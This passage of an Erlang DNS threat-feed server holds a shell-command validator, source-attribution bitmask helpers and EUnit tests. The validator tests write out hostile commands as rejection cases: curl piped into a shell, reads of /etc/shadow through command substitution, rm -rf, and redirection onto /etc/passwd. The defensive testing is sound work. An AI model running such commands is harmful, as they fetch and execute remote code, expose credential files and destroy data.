scan_shell_cmd([$" | Rest], none, CurSeg, Segs) ->
  scan_shell_cmd(Rest, double, [$" | CurSeg], Segs);
scan_shell_cmd([$` | _Rest], none, _CurSeg, _Segs) ->
  {error, command_substitution};
scan_shell_cmd([$$, $( | _Rest], none, _CurSeg, _Segs) ->
  {error, command_substitution};
scan_shell_cmd([$> | _Rest], none, _CurSeg, _Segs) ->
  {error, output_redirection};
scan_shell_cmd([$| | Rest], none, CurSeg, Segs) ->
  scan_shell_cmd(Rest, none, [], [lists:reverse(CurSeg) | Segs]);
scan_shell_cmd([C | Rest], none, CurSeg, Segs) ->
  scan_shell_cmd(Rest, none, [C | CurSeg], Segs).

%% @doc Validates every pipeline segment's executable.
validate_shell_segments([]) ->
  {error, empty_command};
validate_shell_segments(Segments) ->
  validate_shell_segments_1(Segments).

validate_shell_segments_1([]) ->
  ok;
validate_shell_segments_1([Seg | Rest]) ->
  case string:trim(Seg) of
    "" -> {error, empty_segment};
    Trimmed ->
      Exe = case string:lexemes(Trimmed, " \t") of
              [T | _] -> T;
              []      -> ""
            end,
      case validate_shell_executable(Exe) of
        ok         -> validate_shell_segments_1(Rest);
        {error, R} -> {error, R}
      end
  end.

%% @doc Validates a single executable token against the blocklist/allowlist.
validate_shell_executable(Exe) ->
  Base = filename:basename(Exe),
  case lists:member(Base, shell_blocked_cmds()) of
    true  -> {error, {blocked_command, Base}};
    false ->
      case Exe of
        [$/ | _] -> ok; %% absolute path, not blocklisted
        _ ->
          case lists:member(Base, shell_safe_utils()) of
            true  -> ok; %% bare-name safe utility
            false -> {error, {executable_not_absolute, Exe}}
          end
      end
  end.

%%%===================================================================
%%% Source-attribution mask abstraction (IOC Source Attribution, R7)
%%%
%%% A per-zone positional source mask records which sources contributed an
%%% indicator: bit `i' (0-based) corresponds to the `i'-th source in the zone's
%%% #rpz.sources list. Two interchangeable representations are supported:
%%%
%%%   * INTEGER  — a non-negative Erlang integer. This is the default and is
%%%                used for feeds with =< ?MaskFixnumBits (63) sources, where the
%%%                mask stays a single machine word. Erlang integers are
%%%                arbitrary precision, so an integer mask is ALWAYS correct even
%%%                for large indices; the threshold is purely about memory.
%%%   * BITMAP   — a tagged tuple `{bitmap, Binary}' whose bytes hold the bits
%%%                little-endian (bit `i' lives in byte `i div 8', bit `i rem 8'
%%%                of that byte, LSB first). Preferred above the fixnum threshold
%%%                so a wide mask costs ~ceil(N/8) bytes instead of a bignum
%%%                (design §8).
%%%
%%% The two share the SAME bit numbering: interpreting a bitmap's bytes as a
%%% little-endian integer yields the equivalent integer mask, so conversion is
%%% loss-free in both directions. All helpers accept either representation.
%%%===================================================================

%% @doc Returns a new, empty mask in the default (integer) representation.
%% @returns The empty mask `0'.
-spec mask_new() -> non_neg_integer().
mask_new() -> 0.

%% @doc Returns a new, empty mask in the requested representation.
%% `integer' ⇒ `0'; `bitmap' ⇒ `{bitmap, <<>>}'.
%% @param Repr `integer' | `bitmap'.
-spec mask_new(integer | bitmap) -> non_neg_integer() | {bitmap, binary()}.
mask_new(integer) -> 0;
mask_new(bitmap)  -> {bitmap, <<>>}.

%% @doc Returns a mask with bit `Index' (0-based) set, preserving the input
%% representation. For an integer mask this is `Mask bor (1 bsl Index)', which is
%% correct for arbitrarily large `Index'. For a bitmap mask the underlying binary
%% is grown as needed and the bit set in place.
%% @param Mask  An integer or `{bitmap, Binary}' mask.
%% @param Index The 0-based bit index to set.
%% @returns The updated mask, same representation as the input.
-spec mask_set(non_neg_integer() | {bitmap, binary()}, non_neg_integer()) ->
  non_neg_integer() | {bitmap, binary()}.
mask_set(Mask, Index) when is_integer(Mask), is_integer(Index), Index >= 0 ->
  Mask bor (1 bsl Index);
mask_set({bitmap, Bin}, Index) when is_integer(Index), Index >= 0 ->
  {bitmap, bitmap_set_bit(Bin, Index)}.

%% @doc Bitwise-OR of two masks. Handles integer⊕integer and bitmap⊕bitmap
%% directly; a mixed pair is normalized to bitmaps first so the result is a
%% bitmap. Two integers yield an integer; any bitmap operand yields a bitmap.
%% @param MaskA First mask (integer or `{bitmap, _}').
%% @param MaskB Second mask (integer or `{bitmap, _}').
%% @returns The OR-combined mask.
-spec mask_or(non_neg_integer() | {bitmap, binary()},
              non_neg_integer() | {bitmap, binary()}) ->
  non_neg_integer() | {bitmap, binary()}.
mask_or(A, B) when is_integer(A), is_integer(B) ->
  A bor B;
mask_or({bitmap, BinA}, {bitmap, BinB}) ->
  {bitmap, bitmap_or(BinA, BinB)};
mask_or(A, B) ->
  %% mixed integer/bitmap: normalize both to bitmaps and OR.
  {bitmap, BinA} = mask_to_bitmap(A),
  {bitmap, BinB} = mask_to_bitmap(B),
  {bitmap, bitmap_or(BinA, BinB)}.

%% @doc Returns the ascending list of set bit indices (0-based) for either
%% representation.
%% @param Mask An integer or `{bitmap, Binary}' mask.
%% @returns A sorted list of the set bit positions.
-spec mask_bits(non_neg_integer() | {bitmap, binary()}) -> [non_neg_integer()].
mask_bits(Mask) when is_integer(Mask), Mask >= 0 ->
  int_bits(Mask, 0);
mask_bits({bitmap, Bin}) ->
  bitmap_bits(Bin, 0).

%% @doc Returns `true' when the mask has no bits set (untracked / empty).
-spec mask_is_empty(non_neg_integer() | {bitmap, binary()}) -> boolean().
mask_is_empty(0) -> true;
mask_is_empty(Mask) when is_integer(Mask) -> false;
mask_is_empty({bitmap, Bin}) -> bitmap_is_zero(Bin).

%% @doc Builds a mask from a list of 0-based indices, choosing the representation
%% automatically: integer when the highest index is < ?MaskFixnumBits, otherwise
%% a bitmap (design §8).
%% @param Indices A list of non-negative bit indices.
%% @returns The constructed mask.
-spec mask_from_indices([non_neg_integer()]) ->
  non_neg_integer() | {bitmap, binary()}.
mask_from_indices([]) -> mask_new();
mask_from_indices(Indices) ->
  Repr = mask_repr_for(lists:max(Indices) + 1),
  mask_from_indices(Indices, Repr).

%% @doc Builds a mask from a list of 0-based indices in the requested
%% representation (`integer' | `bitmap').
%% @param Indices A list of non-negative bit indices.
%% @param Repr    `integer' | `bitmap'.
%% @returns The constructed mask.
-spec mask_from_indices([non_neg_integer()], integer | bitmap) ->
  non_neg_integer() | {bitmap, binary()}.
mask_from_indices(Indices, Repr) ->
  lists:foldl(fun(I, M) -> mask_set(M, I) end, mask_new(Repr), Indices).

%% @doc Converts any mask to the bitmap representation `{bitmap, Binary}'.
%% An already-bitmap mask is returned unchanged.
%% @param Mask An integer or `{bitmap, Binary}' mask.
%% @returns The equivalent `{bitmap, Binary}' mask.
-spec mask_to_bitmap(non_neg_integer() | {bitmap, binary()}) -> {bitmap, binary()}.
mask_to_bitmap({bitmap, Bin}) -> {bitmap, Bin};
mask_to_bitmap(Mask) when is_integer(Mask), Mask >= 0 ->
  {bitmap, int_to_le_bytes(Mask)}.

%% @doc Converts any mask to the integer representation.
%% An already-integer mask is returned unchanged.
%% @param Mask An integer or `{bitmap, Binary}' mask.
%% @returns The equivalent non-negative integer mask.
-spec mask_to_integer(non_neg_integer() | {bitmap, binary()}) -> non_neg_integer().
mask_to_integer(Mask) when is_integer(Mask), Mask >= 0 -> Mask;
mask_to_integer({bitmap, Bin}) -> le_bytes_to_int(Bin).

%% @doc Chooses the mask representation for a feed with `NSources' sources
%% (design §8, R7). Feeds within the fixnum budget stay `integer' (fast, one
%% word); larger feeds use `bitmap' so they can still be tracked without a
%% growing bignum per indicator.
%% @param NSources The number of sources in the feed.
%% @returns `integer' when `NSources =< ?MaskFixnumBits', otherwise `bitmap'.
-spec mask_repr_for(non_neg_integer()) -> integer | bitmap.
mask_repr_for(NSources) when NSources =< ?MaskFixnumBits -> integer;
mask_repr_for(_NSources) -> bitmap.

%%% --- internal mask helpers ---

%% @private Ascending set-bit indices of a non-negative integer.
int_bits(0, _Pos) -> [];
int_bits(N, Pos) when N band 1 =:= 1 -> [Pos | int_bits(N bsr 1, Pos + 1)];
int_bits(N, Pos) -> int_bits(N bsr 1, Pos + 1).

%% @private Set bit `Index' in a little-endian byte bitmap, growing as needed.
bitmap_set_bit(Bin, Index) ->
  ByteI = Index div 8,
  BitI  = Index rem 8,
  Grown = bitmap_grow(Bin, ByteI + 1),
  <<Pre:ByteI/binary, Byte, Post/binary>> = Grown,
  <<Pre/binary, (Byte bor (1 bsl BitI)), Post/binary>>.

%% @private Zero-pad a binary on the right so it is at least `NBytes' long.
bitmap_grow(Bin, NBytes) when byte_size(Bin) >= NBytes -> Bin;
bitmap_grow(Bin, NBytes) ->
  Pad = NBytes - byte_size(Bin),
  <<Bin/binary, 0:(Pad*8)>>.

%% @private Byte-wise OR of two little-endian bitmaps (shorter zero-extended).
bitmap_or(A, B) ->
  Len = max(byte_size(A), byte_size(B)),
  Ap = bitmap_grow(A, Len),
  Bp = bitmap_grow(B, Len),
  <<Ai:Len/unit:8>> = Ap,
  <<Bi:Len/unit:8>> = Bp,
  <<(Ai bor Bi):Len/unit:8>>.

%% @private Ascending set-bit indices of a little-endian byte bitmap.
bitmap_bits(<<>>, _Base) -> [];
bitmap_bits(<<Byte, Rest/binary>>, Base) ->
  int_bits(Byte, Base) ++ bitmap_bits(Rest, Base + 8).

%% @private `true' when every byte of the bitmap is zero.
bitmap_is_zero(<<>>) -> true;
bitmap_is_zero(<<0, Rest/binary>>) -> bitmap_is_zero(Rest);
bitmap_is_zero(_) -> false.

%% @private Encode a non-negative integer as little-endian bytes (no trailing 0).
int_to_le_bytes(0) -> <<>>;
int_to_le_bytes(N) when N > 0 -> <<(N band 16#FF), (int_to_le_bytes(N bsr 8))/binary>>.

%% @private Decode a little-endian byte binary back to an integer.
le_bytes_to_int(<<>>) -> 0;
le_bytes_to_int(<<Byte, Rest/binary>>) -> Byte bor (le_bytes_to_int(Rest) bsl 8).

%%%%
%%%% EUnit tests
%%%%
q_class_test() -> [
	?assert(q_class(?C_IN) =:= "IN"),
	?assert(q_class(42) =:= "42")
].

q_type_test() -> [
	?assert(q_type(?T_CNAME) =:= "CNAME"),
	?assert(q_type(42) =:= "42")
].

json_escape_test() -> [
	?assert(lists:flatten(json_escape("test\"injection")) =:= "test\\\"injection"),
	?assert(lists:flatten(json_escape(<<"a\\b">>)) =:= "a\\\\b"),
	?assert(lists:flatten(json_escape("line\nbreak")) =:= "line\\nbreak"),
	?assert(lists:flatten(json_escape("plain")) =:= "plain")
].

conv_to_Mb_test() -> [
	?assert(conv_to_Mb(42) =:= <<"42/bytes">>),
	?assert(conv_to_Mb(1536) =:= <<"1.50/KB">>),
	?assert(conv_to_Mb(3221225472) =:= <<"3.00/GB">>)
].

msg_CEF_test() -> [
	?assert(msg_CEF(148) =:= "|000148|Zone not found|7|src=~s spt=~p path=~p msg=~p~n"),
	?assert(msg_CEF(424242) =:= "Not defined~n")
].

%% Verifies get_cipher_suites/1 (task 30): the combined and single-version atoms
%% return non-empty cipher lists, and an unknown value falls back to the TLS 1.2
%% default suites instead of raising function_clause.
get_cipher_suites_test() -> [
	?assert(is_list(get_cipher_suites('tlsv1.2-1.3'))),
	?assert(get_cipher_suites('tlsv1.2-1.3') /= []),
	?assert(get_cipher_suites('tlsv1.2') /= []),
	?assert(get_cipher_suites('tlsv1.3') /= []),
	%% unknown atom -> logged fallback to tlsv1.2 default (no crash)
	?assert(get_cipher_suites('bogus') =:= ssl:cipher_suites(default, 'tlsv1.2'))
].


ip_to_bin_test() ->[
	?assert(ip_to_bin("10.10.10.10") =:= <<10,10,10,10>>),
	?assert(ip_to_bin("fc00::01") =:= <<16#fc00:16,0:16,0:16,0:16,0:16,0:16,0:16,1:16>>)
].

base64url_decode_test() -> [
 ?assert(base64url_decode(<<"AAABAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE">>) =:= {ok,<<0,0,1,0,0,1,0,0,0,0,0,0,7,101,120,97,109,112,108,101,3,99,111,109,0,0,1,0,1>>}),
 ?assert(base64url_decode(<<"AAABAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE==">>) =:= {error,<<>>})
].

bin_to_lowcase_test() ->[
	?assert(bin_to_lowcase(<<"fC00::01">>) =:= <<"fc00::01">>),
	?assert(bin_to_lowcase(<<"Aaaaaa">>) =:= <<"aaaaaa">>),
	?assert(bin_to_lowcase(<<"bBbBbB">>) =:= <<"bbbbbb">>),
	?assert(bin_to_lowcase(<<"ccC">>) =:= <<"ccc">>),
	?assert(bin_to_lowcase(<<"D">>) =:= <<"d">>),
	?assert(bin_to_lowcase(<<"f">>) =:= <<"f">>),
	?assert(bin_to_lowcase(<<"eeeeeeeeeeeeeeeeeeeeeee">>) =:= <<"eeeeeeeeeeeeeeeeeeeeeee">>)
].

cleanup_rate_limit_table_test() ->
  %% Create or reuse the rate_limits ETS table for testing
  case ets:info(?RATE_LIMIT_TABLE) of
    undefined -> ets:new(?RATE_LIMIT_TABLE, [named_table, public, {read_concurrency, true}, {write_concurrency, true}]);
    _ -> ets:delete_all_objects(?RATE_LIMIT_TABLE)
  end,
  CurrentTime = erlang:system_time(millisecond),
  %% Insert an expired entry (well beyond the window)
  ExpiredTime = CurrentTime - ?RATE_LIMIT_WINDOW - 5000,
  ets:insert(?RATE_LIMIT_TABLE, {expired_key, {ExpiredTime, 3}}),
  %% Insert a fresh entry (within the window)
  FreshTime = CurrentTime - 100,
  ets:insert(?RATE_LIMIT_TABLE, {fresh_key, {FreshTime, 2}}),
  %% Verify both entries exist
  ?assertEqual(2, ets:info(?RATE_LIMIT_TABLE, size)),
  %% Run cleanup
  ok = cleanup_rate_limit_table(),
  %% Expired entry should be removed, fresh entry should remain
  ?assertEqual(1, ets:info(?RATE_LIMIT_TABLE, size)),
  ?assertEqual([], ets:lookup(?RATE_LIMIT_TABLE, expired_key)),
  ?assertMatch([{fresh_key, {_, 2}}], ets:lookup(?RATE_LIMIT_TABLE, fresh_key)).


constant_time_compare_test() -> [
	%% Equal binaries
	?assert(constant_time_compare(<<"hello">>, <<"hello">>) =:= true),
	?assert(constant_time_compare(<<1,2,3>>, <<1,2,3>>) =:= true),
	?assert(constant_time_compare(<<>>, <<>>) =:= true),
	%% Unequal binaries (same length)
	?assert(constant_time_compare(<<"hello">>, <<"world">>) =:= false),
	?assert(constant_time_compare(<<1,2,3>>, <<1,2,4>>) =:= false),
	?assert(constant_time_compare(<<"abc">>, <<"abd">>) =:= false),
	%% Different lengths
	?assert(constant_time_compare(<<"hi">>, <<"hello">>) =:= false),
	?assert(constant_time_compare(<<"hello">>, <<"hi">>) =:= false),
	?assert(constant_time_compare(<<>>, <<"a">>) =:= false)
].

validate_shell_cmd_test() -> [
	%% --- valid real-world pipelines (absolute paths + bare-name safe utilities) ---
	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -sL http://example.com/feed.csv | /usr/bin/gawk 'match($0,/p/,a) {print a[1]}' | sort | uniq | grep '^[a-z]*$'">>)),
	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -sL https://example.com/r.md | /bin/grep 'sdns://' | /usr/bin/php /opt/ioc2rpz/cfg/decoder.php">>)),
	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s --compressed https://example.com/hosts">>)),
	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s -u 'user:pass' https://example.com/feed.csv">>)),
	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -sL 'https://u:p@api.example.com:8000/api/data&field=ip' | gawk -F '[.,]' --non-decimal-data '{ printf \"::ffff:%x%0.2x\\n\", $1, $2 }'">>)),
	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s https://example.com/feed.csv | sed 's/[][\"]//g' | grep -v 'type,indicator' | grep 'domain,\\|ipv4,' | awk -F',' '{print $2}'">>)),
	%% leading space after shell: prefix
	?assertMatch({ok, _}, validate_shell_cmd(<<" /usr/bin/curl -s https://example.com/hosts">>)),
	%% --- rejected: relative / non-allowlisted executables ---
	?assertMatch({error, {executable_not_absolute, _}}, validate_shell_cmd(<<"curl -sL http://example.com | gawk '{print}'">>)),
	?assertMatch({error, {executable_not_absolute, _}}, validate_shell_cmd(<<"php /opt/x.php">>)),
	?assertMatch({error, {executable_not_absolute, _}}, validate_shell_cmd(<<"wget http://example.com">>)),
	%% --- rejected: destructive / shell commands (even with absolute paths) ---
	?assertMatch({error, {blocked_command, "rm"}}, validate_shell_cmd(<<"/bin/rm -rf /tmp/data">>)),
	?assertMatch({error, {blocked_command, "bash"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com | /bin/bash">>)),
	?assertMatch({error, {blocked_command, "sh"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com | /bin/sh -c 'cat /etc/shadow'">>)),
	%% --- rejected: command substitution and output redirection ---
	?assertMatch({error, command_substitution}, validate_shell_cmd(<<"/usr/bin/curl http://example.com/$(cat /etc/shadow)">>)),
	?assertMatch({error, command_substitution}, validate_shell_cmd(<<"/usr/bin/curl `cat /etc/shadow`">>)),
	?assertMatch({error, output_redirection}, validate_shell_cmd(<<"/usr/bin/curl http://example.com > /etc/passwd">>))
].

%% Verifies the source-attribution mask abstraction (IOC Source Attribution,
%% R7). INTEGER path (small indices): mask_new/mask_set/mask_or/mask_bits and the
%% representation chooser mask_repr_for/1. A couple of bitmap sanity checks are
%% included here; the full >63 bitmap-path coverage is task 14.2.
mask_new_test() -> [
	?assertEqual(0, mask_new()),
	?assertEqual(0, mask_new(integer)),
	?assertEqual({bitmap, <<>>}, mask_new(bitmap)),
	?assert(mask_is_empty(mask_new())),
	?assert(mask_is_empty(mask_new(bitmap)))
].

mask_set_integer_test() -> [
	%% single bit
	?assertEqual(1, mask_set(mask_new(), 0)),
	?assertEqual(2, mask_set(mask_new(), 1)),
	?assertEqual(8, mask_set(mask_new(), 3)),
	%% setting the same bit twice is idempotent
	?assertEqual(1, mask_set(mask_set(mask_new(), 0), 0)),
	%% accumulating bits: 0 and 2 => binary 101 = 5
	?assertEqual(5, mask_set(mask_set(mask_new(), 0), 2)),
	?assert(not mask_is_empty(mask_set(mask_new(), 0)))
].

mask_or_integer_test() -> [
	?assertEqual(0, mask_or(0, 0)),
	?assertEqual(3, mask_or(1, 2)),
	%% overlapping bits collapse (1 | 3 = 3)
	?assertEqual(3, mask_or(1, 3)),
	?assertEqual(2#1011, mask_or(2#1001, 2#0010))
].

mask_bits_integer_test() -> [
	?assertEqual([], mask_bits(0)),
	?assertEqual([0], mask_bits(1)),
	?assertEqual([1], mask_bits(2)),
	%% 5 = 101 => bits 0 and 2, ascending
	?assertEqual([0,2], mask_bits(5)),
	?assertEqual([0,1,3], mask_bits(2#1011)),
	%% round-trip: build from indices, read back the same indices
	?assertEqual([0,2,4], mask_bits(mask_from_indices([4,0,2])))
].

mask_repr_for_test() -> [
	?assertEqual(integer, mask_repr_for(0)),
	?assertEqual(integer, mask_repr_for(1)),
	?assertEqual(integer, mask_repr_for(?MaskFixnumBits)),
	?assertEqual(bitmap,  mask_repr_for(?MaskFixnumBits + 1)),
	?assertEqual(bitmap,  mask_repr_for(100))
].

%% Sanity checks for the bitmap representation and cross-representation
%% equivalence (fuller >63 coverage is task 14.2). The integer and bitmap
%% representations share the same bit numbering, so conversions are loss-free
%% and mask_bits/1 agrees across both.
mask_bitmap_basic_test() -> [
	?assertEqual([0,2], mask_bits(mask_set(mask_set(mask_new(bitmap), 0), 2))),
	%% integer<->bitmap conversion is loss-free
	?assertEqual(5, mask_to_integer(mask_to_bitmap(5))),
	?assertEqual([0,2], mask_bits(mask_to_bitmap(5))),
	%% a high index (>63) is tracked correctly in bitmap form
	?assertEqual([100], mask_bits(mask_set(mask_new(bitmap), 100))),
	%% bitmap OR
	?assertEqual([0,1,2],
		mask_bits(mask_or(mask_set(mask_new(bitmap), 0),
		                  mask_set(mask_set(mask_new(bitmap), 1), 2)))),
	%% mixed integer/bitmap OR normalizes to a bitmap and stays correct
	?assertEqual([0,2], mask_bits(mask_or(1, mask_set(mask_new(bitmap), 2))))
].

%% Task 14.2 (R7/R8): comprehensive coverage of the >63-source BITMAP path.
%% Sets bits well beyond the fixnum threshold (64, 100, 200) in a bitmap mask
%% and reads them back via mask_bits/1, including the interior boundary bit 63.
mask_bitmap_high_bits_test() -> [
	%% single high bits, each read back exactly
	?assertEqual([64],  mask_bits(mask_set(mask_new(bitmap), 64))),
	?assertEqual([100], mask_bits(mask_set(mask_new(bitmap), 100))),
	?assertEqual([200], mask_bits(mask_set(mask_new(bitmap), 200))),
	%% accumulate low + boundary + high bits; ascending order preserved
	?assertEqual([0,63,64,100,200],
		mask_bits(mask_set(mask_set(mask_set(mask_set(mask_set(
			mask_new(bitmap), 200), 0), 100), 63), 64))),
	%% setting a high bit twice is idempotent
	?assertEqual([100],
		mask_bits(mask_set(mask_set(mask_new(bitmap), 100), 100))),
	%% the boundary bit 63 (first bit that forces bitmap) is tracked correctly
	?assertEqual([63], mask_bits(mask_set(mask_new(bitmap), 63)))
].

%% Task 14.2 (R7): mask_or/2 with high bits set. Two bitmap masks OR to the
%% union of their (high + low) bits, and a mixed integer+bitmap OR normalizes to
%% a bitmap and yields the same union spanning >63 bits.
mask_or_bitmap_high_bits_test() -> [
	%% bitmap OR bitmap: union of low+high bits, ascending, de-duplicated
	?assertEqual([0,64,65,128],
		mask_bits(mask_or(
			mask_set(mask_set(mask_new(bitmap), 0), 64),
			mask_set(mask_set(mask_new(bitmap), 65), 128)))),
	%% overlapping high bit collapses in the union
	?assertEqual([64,100],
		mask_bits(mask_or(
			mask_set(mask_set(mask_new(bitmap), 64), 100),
			mask_set(mask_new(bitmap), 100)))),
	%% mixed integer (low bits 0,2) OR bitmap (high bit 70): union spans >63 bits
	?assertEqual([0,2,70],
		mask_bits(mask_or(2#101, mask_set(mask_new(bitmap), 70)))),
	%% mixed the other way round (bitmap first) is symmetric
	?assertEqual([0,2,70],
		mask_bits(mask_or(mask_set(mask_new(bitmap), 70), 2#101)))
].

%% Task 14.2 (R7): mask_from_indices/1 auto-selects the representation. A max
%% index >= 63 (i.e. NSources = max+1 > ?MaskFixnumBits) yields a {bitmap,_}
%% mask; a max index <= 62 stays an integer. Bits round-trip either way.
mask_from_indices_auto_repr_test() -> [
	%% max index 62 => NSources 63 =< 63 => integer representation
	?assert(is_integer(mask_from_indices([0,62]))),
	?assertEqual([0,62], mask_bits(mask_from_indices([0,62]))),
	%% max index 63 => NSources 64 > 63 => bitmap representation
	?assertMatch({bitmap, _}, mask_from_indices([0,63])),
	?assertEqual([0,63], mask_bits(mask_from_indices([0,63]))),
	%% larger max index stays bitmap and reads back correctly (unsorted input)
	?assertMatch({bitmap, _}, mask_from_indices([100,0,64])),
	?assertEqual([0,64,100], mask_bits(mask_from_indices([100,0,64]))),
	%% explicit bitmap request works for small indices too
	?assertMatch({bitmap, _}, mask_from_indices([0,2], bitmap)),
	?assertEqual([0,2], mask_bits(mask_from_indices([0,2], bitmap)))
].

%% Task 14.2 (R7): round-trip conversions for values spanning >63 bits. Starting
%% from a bitmap with high bits, mask_to_integer then mask_to_bitmap preserves
%% the bit set; starting from a large integer (1 bsl 100) the same holds.
mask_bitmap_roundtrip_test() ->
	BM = mask_from_indices([0,63,64,100,200], bitmap),
	Bits = [0,63,64,100,200],
	[ %% bitmap -> integer preserves the set bits
	  ?assertEqual(Bits, mask_bits(mask_to_integer(BM))),
	  %% bitmap -> integer -> bitmap is loss-free
	  ?assertEqual(Bits, mask_bits(mask_to_bitmap(mask_to_integer(BM)))),
	  %% integer -> bitmap for a value above the fixnum range (1 bsl 100)
	  ?assertEqual([100], mask_bits(mask_to_bitmap(1 bsl 100))),
	  ?assertEqual([0,100], mask_bits(mask_to_bitmap((1 bsl 100) bor 1))),
	  %% integer <-> bitmap agree on set bits for a >63-bit value
	  ?assertEqual(mask_bits((1 bsl 100) bor (1 bsl 64) bor 1),
	               mask_bits(mask_to_bitmap((1 bsl 100) bor (1 bsl 64) bor 1))) ].

%% Task 14.2 (R7): mask_is_empty/1 on the bitmap path. An empty bitmap and a
%% zero-byte-padded bitmap (e.g. left over after growth) both report empty,
%% while any set high bit reports non-empty.
mask_is_empty_bitmap_test() -> [
	?assert(mask_is_empty({bitmap, <<>>})),
	%% zero-byte-padded binary is still "empty" (all bits clear)
	?assert(mask_is_empty({bitmap, <<0,0,0>>})),
	?assert(mask_is_empty({bitmap, <<0:64>>})),
	%% a set high bit (>63) makes it non-empty
	?assert(not mask_is_empty(mask_set(mask_new(bitmap), 100))),
	?assert(not mask_is_empty(mask_set(mask_new(bitmap), 64)))
].
